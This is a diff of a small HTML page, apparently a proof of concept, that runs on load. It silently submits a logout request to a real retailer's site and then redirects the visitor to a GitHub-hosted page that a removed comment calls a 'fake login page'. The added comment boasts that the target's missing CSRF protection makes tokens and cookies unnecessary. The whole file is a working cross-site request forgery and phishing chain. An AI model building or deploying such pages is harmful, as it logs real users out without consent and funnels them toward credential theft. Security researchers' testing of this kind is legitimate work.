@@ -5,28 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Logout and Redirect</title>
     <script>
-        // Wait for the page to load, then submit the logout form
         window.onload = function() {
-            // Create the logout form dynamically
             var form = document.createElement('form');
-            form.method = 'GET';  // Use GET method, matching the target's logout endpoint
-            form.action = 'https://www.boozt.com/logout';  // Replace with the correct logout URL of the target
-
-            // Optionally, you can add a hidden CSRF token if the target uses one (but we know CSRF isn't being protected here)
-            // var csrfToken = document.createElement('input');
-            // csrfToken.type = 'hidden';
-            // csrfToken.name = 'csrf_token';
-            // csrfToken.value = 'your_token_here';
-            // form.appendChild(csrfToken);
-
-            // Submit the logout form
+            form.method = 'GET';  
+            form.action = 'https://www.boozt.com/logout';  
             document.body.appendChild(form);
             form.submit();
-
-            // After logout is complete, redirect to your fake login page
-            setTimeout(function() {
-                window.location.href = "https://maxhunterr.github.io/csrf-test/index.html";  // Replace with the correct URL to your fake login page
-            }, 1000);  // Delay to ensure the logout action is processed first
+            setTimeout(function() {                                                                            //  I DONT NEED ANY CSRF TOKEN OR COOKIES COZ THEY RE MISCONFIGURED.
+                window.location.href = "https://maxhunterr.github.io/csrf-test/index.html";  
+            }, 1000);  
         };
     </script>
 </head>
